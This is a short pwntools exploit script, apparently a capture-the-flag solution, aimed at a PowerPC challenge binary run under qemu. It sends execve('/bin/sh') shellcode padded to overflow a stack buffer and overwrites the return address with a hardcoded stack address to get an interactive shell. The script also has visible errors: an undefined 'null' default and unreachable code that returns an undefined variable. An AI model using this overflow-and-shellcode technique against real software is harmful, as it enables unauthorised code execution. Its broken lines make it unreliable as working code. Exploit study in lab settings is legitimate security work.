from pwn import *
import sys

context.log_level = 'debug'
context.endian = 'big'
context.arch='powerpc'
Debug = sys.argv[1]

elf = ELF('./PPPPPPC')

def get_sh(other_libc=null):
    if Debug == '1':
        return process(["./qemu-ppc-static","-g","1234","-L","./","./PPPPPPC"])
        log.info('Please use GDB remote!(Enter to continue)')
        pause()
        return r
    else:
        return process(["./qemu-ppc-static","-L","./","./PPPPPPC"])

r = get_sh()
r.recvuntil("Tell me your name: ")

sc = asm('''
xor 3, 3, 3
xor 4, 4, 4
xor 5, 5, 5
li 0, 11
mflr r3
addi r3, r3, 7*4
sc
.long 0x2f62696e
.long 0x2f736800
''')
r.sendline(sc.ljust(0x13c, b'\x00')+p32(0xf6ffebe8))
# 0xf6ffebe8

r.interactive()